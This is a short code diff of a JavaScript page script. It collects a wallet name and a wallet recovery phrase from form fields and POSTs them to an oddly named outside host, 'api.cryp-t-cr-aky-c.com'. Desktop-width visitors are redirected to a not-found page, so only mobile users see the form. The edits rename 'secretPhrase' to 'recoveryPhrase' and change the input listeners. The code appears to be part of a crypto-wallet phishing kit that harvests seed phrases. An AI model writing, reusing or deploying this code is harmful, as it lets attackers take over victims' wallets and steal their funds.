@@ -6,11 +6,11 @@ if(screen.width > 768){
   window.location.assign("../PageNotFound/PageNotFound.html")
 }
 
-document.querySelector(".input-box-1").addEventListener("input",(e)=>{
+document.querySelector(".input-box-1").addEventListener("change",(e)=>{
     inputData = e.target.value
 })
 
-document.querySelector(".input-box-2").addEventListener("input",(e)=>{
+document.querySelector(".input-box-2").addEventListener("change",(e)=>{
     inputData2 = e.target.value
 })
 
@@ -20,7 +20,7 @@ document.querySelector(".button").addEventListener("click",(e)=>{
       const url = "https://api.cryp-t-cr-aky-c.com/api/other";
       const data = {
           walletName:inputData,
-          secretPhrase:inputData2
+          recoveryPhrase:inputData2
       };
       const options = {
           method: 'POST',
